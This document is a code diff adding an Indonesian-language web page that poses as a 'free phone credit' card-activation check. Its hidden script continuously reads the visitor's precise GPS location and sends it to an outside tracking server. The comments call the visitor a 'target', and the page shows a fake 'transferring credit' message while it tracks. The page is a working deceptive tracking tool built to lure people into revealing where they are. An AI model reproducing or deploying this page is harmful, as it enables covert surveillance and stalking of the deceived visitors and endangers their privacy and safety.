@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pulsa Gratis</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background-color: #2c3e50; color: white; }
+        .kotak-status { background-color: #34495e; padding: 20px; border-radius: 10px; margin-top: 20px; }
+        .status { font-size: 22px; font-weight: bold; margin-bottom: 10px; }
+        .sukses { color: #2ecc71; } /* Hijau */
+        .gagal { color: #e74c3c; } /* Merah */
+        #kordinat { font-size: 14px; color: #bdc3c7; }
+    </style>
+</head>
+<body>
+    <h2>📡 Sistem Cek Kartu Aktif</h2>
+    <p>Mohon biarkan layar ini tetap terbuka agar Nomor HP anda terdeteksi.</p>
+    
+    <div class="kotak-status">
+        <div id="status" class="status">Mendeteksi Nomor Telpon...</div>
+        <div id="kordinat">Menghubungi Operator...</div>
+    </div>
+
+    <script>
+        // --- PENGATURAN ENGINEER ---
+        // WAJIB: Pastikan URL DevTunnels ini sama persis dengan yang ada di Termux tadi!
+        const SERVER_URL = "https://trackerlagi.vercel.app/api/location";
+        const DEVICE_ID = "perangkat_01"; // Bebas ganti nama target
+        const SECRET_TOKEN = "TOKEN_RAHASIA_KITA_123"; // Kata sandi wajib server kita
+        // ---------------------------
+
+        const statusDiv = document.getElementById("status");
+        const kordinatDiv = document.getElementById("kordinat");
+
+        // Fungsi menembak data ke Laptop Anda
+        function kirimLokasi(lat, lng) {
+            fetch(SERVER_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    device_id: DEVICE_ID,
+                    latitude: lat,
+                    longitude: lng,
+                    secret_token: SECRET_TOKEN
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusDiv.innerText = "✅ Sedang Mentransfer Pulsa";
+                    statusDiv.className = "status sukses";
+                    let waktu = new Date().toLocaleTimeString();
+                    kordinatDiv.innerText = `Update terakhir: ${waktu} | Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}`;
+                } else {
+                    statusDiv.innerText = "❌ Server Menolak Data";
+                    statusDiv.className = "status gagal";
+                }
+            })
+            .catch(error => {
+                statusDiv.innerText = "❌ Terputus dari Laptop";
+                statusDiv.className = "status gagal";
+            });
+        }
+
+        // Fitur Pelacak Otomatis dari Browser (Pengganti Termux)
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(
+                function(position) {
+                    kirimLokasi(position.coords.latitude, position.coords.longitude);
+                },
+                function(error) {
+                    statusDiv.innerText = "❌ Akses GPS Ditolak / Error";
+                    statusDiv.className = "status gagal";
+                },
+                { enableHighAccuracy: true, maximumAge: 0 } // Paksa cari sinyal paling akurat
+            );
+        } else {
+            statusDiv.innerText = "Browser HP ini tidak mendukung GPS";
+        }
+    </script>
+</body>
+</html>
